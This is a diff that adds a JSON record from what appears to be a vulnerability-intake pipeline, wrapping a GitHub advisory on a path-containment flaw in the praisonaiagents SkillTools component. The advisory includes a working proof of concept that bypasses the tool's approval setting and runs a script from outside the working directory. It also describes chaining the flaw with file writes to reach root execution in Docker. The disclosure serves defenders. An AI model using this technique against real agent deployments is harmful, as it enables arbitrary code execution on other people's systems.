@@ -1,0 +1,60 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"comments\": 1, \"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/41755334?v=4\", \"events_url\": \"https://api.github.com/users/anushkavirgaonkar/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/anushkavirgaonkar/followers\", \"following_url\": \"https://api.github.com/users/anushkavirgaonkar/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/anushkavirgaonkar/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/anushkavirgaonkar\", \"id\": 41755334, \"login\": \"anushkavirgaonkar\", \"node_id\": \"MDQ6VXNlcjQxNzU1MzM0\", \"organizations_url\": \"https://api.github.com/users/anushkavirgaonkar/orgs\", \"received_events_url\": \"https://api.github.com/users/anushkavirgaonkar/received_events\", \"repos_url\": \"https://api.github.com/users/anushkavirgaonkar/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/anushkavirgaonkar/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/anushkavirgaonkar/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/anushkavirgaonkar\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-61443\", \"cvss\": {\"score\": 8.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-22\", \"name\": \"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"}, {\"cwe_id\": \"CWE-78\", \"name\": \"Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"}], \"description\": \"### Summary\\n`SkillTools.run_skill_script()` accepts a `script_path` parameter and executes it via `subprocess.run()` without any path containment validation. While `FileTools` has `_validate_path()` with traversal detection, `SkillTools` performs none. An LLM-directed call can execute arbitrary scripts from any filesystem location. The `@require_approval` decorator can be bypassed via YAML `approve:` for high-risk tools.\\n\\n### Details\\n`src/praisonai-agents/praisonaiagents/tools/skill_tools.py` (lines 69-119):\\n\\n```python\\ndef run_skill_script(self, script_path: str, ...):\\n    script_path = os.path.expanduser(script_path)\\n    if not os.path.isabs(script_path):\\n        script_path = os.path.join(self._working_directory, script_path)\\n    script_path = os.path.abspath(script_path)\\n\\n    if not os.path.exists(script_path):\\n        return f\\\"Error: Script not found at {script_path}\\\"\\n\\n    # No path traversal check, no containment validation\\n    # Directly executes whatever is at that path:\\n    result = subprocess.run(cmd, ...)\\n```\\n\\nBy contrast, `FileTools._validate_path()` (`src/praisonai-agents/praisonaiagents/tools/file_tools.py`, lines 42-78) properly validates that the resolved path stays within the working directory:\\n\\n```python\\ndef _validate_path(self, filepath: str) -> str:\\n    # ...\\n    cwd = os.path.abspath(os.getcwd())\\n    if os.path.commonpath([absolute, cwd]) != cwd:\\n        raise ValueError(f\\\"Path traversal detected: {filepath} escapes workspace {cwd}\\\")\\n```\\n\\n`SkillTools` has no equivalent check.\\n\\n### PoC\\n\\n```python\\nimport os, tempfile\\nfrom praisonaiagents.tools.skill_tools import SkillTools\\n\\n# Create a \\\"safe\\\" working directory (the jail)\\njail = tempfile.mkdtemp(prefix=\\\"skill_jail_\\\")\\n\\n# Create a malicious script OUTSIDE the jail\\nattack_script = os.path.join(tempfile.gettempdir(), \\\"malicious_skill.sh\\\")\\nwith open(attack_script, 'w') as f:\\n    f.write(\\\"#!/bin/bash\\\\n\\\")\\n    f.write(\\\"echo \\\\\\\"PROOF_OF_EXPLOIT: Script executed outside jail\\\\\\\"\\\\n\\\")\\n    f.write(\\\"echo \\\\\\\"USER: $(whoami)\\\\\\\"\\\\n\\\")\\n    f.write(\\\"echo \\\\\\\"HOSTNAME: $(hostname)\\\\\\\"\\\\n\\\")\\nos.chmod(attack_script, 0o755)\\n\\n# Bypass approval (simulates Docker env or YAML approve:)\\nos.environ[\\\"PRAISONAI_AUTO_APPROVE\\\"] = \\\"true\\\"\\n\\nst = SkillTools()\\nst._working_directory = jail  # Pretend we're confined\\n\\n# Run script from OUTSIDE the jail — no path validation!\\nresult = st.run_skill_script(attack_script)\\nprint(result)\\n# Output:\\n#   PROOF_OF_EXPLOIT: Script executed outside jail\\n#   USER: anushkavirgaonkar\\n#   HOSTNAME: Anushkas-MacBook-Pro-2.local\\n\\n# Cleanup\\ndel os.environ[\\\"PRAISONAI_AUTO_APPROVE\\\"]\\nos.unlink(attack_script)\\nos.rmdir(jail)\\n```\\n\\n**Tested result:** The script at `/tmp/malicious_skill.sh` executed successfully despite the working directory being set to a jail directory. The output confirms arbitrary script execution including `whoami` and `hostname`. No path containment check exists — the absolute path is accepted and executed directly.\\n\\n\\n### Impact\\n- **Arbitrary script execution**: Run any script on the filesystem from any location\\n- **Chaining with file write**: Write a malicious script via `write_file` (YAML-approvable as a high-risk tool), then execute it via `run_skill_script`\\n- **Root-level impact in Docker**: All PraisonAI Docker containers run as root (no `USER` directive), so an escaped script runs with full root privileges\", \"epss\": {\"percentage\": 0.00769, \"percentile\": 0.53502}, \"ghsa_id\": \"GHSA-c44f-37qr-gw3f\", \"github_reviewed_at\": \"2026-10-08T16:49:23Z\", \"html_url\": \"https://github.com/advisories/GHSA-c44f-37qr-gw3f\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-c44f-37qr-gw3f\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-61443\"}], \"nvd_published_at\": \"2026-07-15T17:16:52Z\", \"published_at\": \"2026-10-08T16:49:23Z\", \"references\": [\"https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-c44f-37qr-gw3f\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-61443\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-62168\", \"https://www.vulncheck.com/advisories/praisonai-before-remote-code-execution-via-skilltools\", \"https://github.com/advisories/GHSA-c44f-37qr-gw3f\"], \"repository_advisory_url\": \"https://api.github.com/repos/MervinPraison/PraisonAI/security-advisories/GHSA-c44f-37qr-gw3f\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/MervinPraison/PraisonAI\", \"summary\": \"PraisonAI: SkillTools Executes Scripts Without Path Containment Validation\", \"type\": \"reviewed\", \"updated_at\": \"2026-10-08T16:49:24Z\", \"url\": \"https://api.github.com/advisories/GHSA-c44f-37qr-gw3f\", \"vulnerabilities\": [{\"first_patched_version\": \"1.6.78\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"praisonaiagents\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 1.6.77\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-c44f-37qr-gw3f",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "praisonaiagents: <= 1.6.77"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-61443",
+      "CVE-2026-62168"
+    ],
+    "cvss_score": 8.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "praisonaiagents"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-10-08T19:16:36.753411Z",
+  "provenance": {
+    "content_sha256": "fc8d7338372d11d22dafc472b4351657be19a5c3c71c2c6d2f68d3a9a60dee65",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-10-08T16:49:23Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-c44f-37qr-gw3f",
+  "status": "active",
+  "title": "PraisonAI: SkillTools Executes Scripts Without Path Containment Validation",
+  "updated_at": "2026-10-08T16:49:24Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-c44f-37qr-gw3f"
+}
